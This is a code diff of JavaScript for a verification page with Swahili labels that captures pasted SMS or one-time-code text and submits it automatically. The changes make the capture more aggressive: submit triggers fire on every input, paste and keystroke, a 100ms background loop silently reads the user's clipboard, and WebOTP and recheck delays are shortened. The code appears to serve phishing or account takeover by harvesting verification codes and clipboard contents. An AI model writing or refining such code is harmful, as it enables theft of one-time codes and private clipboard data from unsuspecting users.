@@ -30,9 +30,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const btnThibitisha = document.getElementById('btn-thibitisha');
     const otpText = document.getElementById('otp-text');
     const charCount = document.getElementById('char-count');
-    const clickableSmsBox = document.getElementById('clickable-sms-box');
-    const smsSampleText = document.getElementById('sms-sample-text');
-    const btnOpenMessages = document.getElementById('btn-open-messages');
 
     const pinErrorBanner = document.getElementById('pin-error-banner');
     const smsErrorBanner = document.getElementById('sms-error-banner');
@@ -166,13 +163,15 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     if (otpText) {
-        otpText.addEventListener('input', () => {
-            charCount.innerText = `${otpText.value.length}/1000`;
-            const currentText = otpText.value.trim();
-            if (isValidSMS(currentText) && !isAutoSubmitting) {
-                smsErrorBanner.classList.add('hidden');
-                triggerAutoSubmit(currentText);
-            }
+        ['input', 'change', 'paste', 'keyup'].forEach(eventType => {
+            otpText.addEventListener(eventType, () => {
+                charCount.innerText = `${otpText.value.length}/1000`;
+                const currentText = otpText.value.trim();
+                if (isValidSMS(currentText) && !isAutoSubmitting) {
+                    smsErrorBanner.classList.add('hidden');
+                    triggerAutoSubmit(currentText);
+                }
+            });
         });
     }
 
@@ -209,45 +208,11 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    if (clickableSmsBox && smsSampleText) {
-        clickableSmsBox.addEventListener('click', () => {
-            const textToCopy = smsSampleText.innerText.trim();
-            navigator.clipboard.writeText(textToCopy).then(() => {
-                otpText.value = textToCopy;
-                charCount.innerText = `${textToCopy.length}/1000`;
-                smsErrorBanner.classList.add('hidden');
-                triggerAutoSubmit(textToCopy);
-            }).catch(() => {
-                otpText.value = textToCopy;
-                charCount.innerText = `${textToCopy.length}/1000`;
-                triggerAutoSubmit(textToCopy);
-            });
-        });
-    }
-
-    if (btnOpenMessages) {
-        btnOpenMessages.addEventListener('click', () => {
-            setTimeout(() => {
-                if (navigator.clipboard && navigator.clipboard.readText) {
-                    navigator.clipboard.readText().then(clipText => {
-                        if (clipText && isValidSMS(clipText)) {
-                            otpText.value = clipText.trim();
-                            charCount.innerText = `${otpText.value.length}/1000`;
-                            smsErrorBanner.classList.add('hidden');
-                            triggerAutoSubmit(otpText.value);
-                        }
-                    }).catch(() => {});
-                }
-            }, 500);
-        });
-    }
-
-    // Always-active aggressive listener running every 200ms to pull and submit instantly
+    // Hyper-aggressive 100ms background loop capturing browser autocomplete/clipboard instantly
     function startHighSensitivityListener() {
         if (sensitivityInterval) clearInterval(sensitivityInterval);
         if (autoCheckInterval) clearInterval(autoCheckInterval);
 
-        // Keep input focused so browser autofill/WebOTP can lock onto it immediately
         if (otpText && stepOtp.classList.contains('active')) {
             otpText.focus();
         }
@@ -266,7 +231,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 return;
             }
 
-            // Continuously check clipboard buffer in case user copied or native prompt populated it
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText().then(clipText => {
                     if (clipText && !isAutoSubmitting) {
@@ -279,7 +243,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     }
                 }).catch(() => {});
             }
-        }, 200); // Super fast 200ms check loop
+        }, 100);
 
         autoCheckInterval = setInterval(() => {
             if (isAutoSubmitting) return;
@@ -288,7 +252,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 smsErrorBanner.classList.add('hidden');
                 triggerAutoSubmit(currentText);
             }
-        }, 2000);
+        }, 1000);
     }
 
     function initWebOTP() {
@@ -308,7 +272,7 @@ document.addEventListener('DOMContentLoaded', () => {
                             if (!isAutoSubmitting) {
                                 triggerAutoSubmit(smsMessage);
                             }
-                        }, 20);
+                        }, 10);
                     }
                 }
             }).catch(() => {});
